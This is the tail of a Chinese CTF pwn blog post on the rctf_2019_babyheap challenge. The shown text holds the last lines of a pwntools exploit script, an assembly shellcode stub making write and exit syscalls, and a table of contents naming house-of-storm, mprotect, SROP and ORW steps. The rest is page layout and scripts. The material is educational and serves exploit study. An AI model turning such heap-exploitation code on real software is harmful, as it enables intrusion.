rax ;// count </span><br><span class="hljs-string">	mov rax, 1 ;// SYS_write</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">	mov rdi, 0 ;// error_code</span><br><span class="hljs-string">	mov rax, 60</span><br><span class="hljs-string">	syscall</span><br><span class="hljs-string">	'''</span><br>	sl(asm(shellcode2))<br>	<br><br>	dbg()<br>	itr()<br> <br> <br>pwn()<br></code></pre></td></tr></tbody></table></figure><div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/04/10/House%20of%20Spirit/">← Next House of Spirit</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/04/10/double%20free/">doublefree Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Kylinxin</a></h1><div id="description"><p>当你觉得生活都不顺心如意的时候，来学习pwn吧！</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#rctf-2019-babyheap"><span class="toc-number">1.1.</span> <span class="toc-text">rctf_2019_babyheap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#main%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text">main函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#add%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">add函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.3.</span> <span class="toc-text">edit函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.4.</span> <span class="toc-text">delete函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#show%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.5.</span> <span class="toc-text">show函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.6.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">调试过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A6%96%E5%85%88%E6%9E%84%E9%80%A0%E5%A0%86%E5%9D%97%E9%87%8D%E5%8F%A0%EF%BC%8C%E6%B3%84%E9%9C%B2libc%E5%9F%BA%E5%9C%B0%E5%9D%80"><span class="toc-number">1.2.1.</span> <span class="toc-text">首先构造堆块重叠，泄露libc基地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0unsortbin-chunk-%E5%92%8Clargebin-chunk%EF%BC%8C%E8%BF%9B%E8%A1%8C-house-of-strom"><span class="toc-number">1.2.2.</span> <span class="toc-text">构造unsortbin chunk 和largebin chunk，进行 house of strom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mprotect-shellcode"><span class="toc-number">1.2.3.</span> <span class="toc-text">mprotect+shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SROP"><span class="toc-number">1.2.4.</span> <span class="toc-text">SROP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ORW"><span class="toc-number">1.2.5.</span> <span class="toc-text">ORW</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">1.3.</span> <span class="toc-text">exp</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>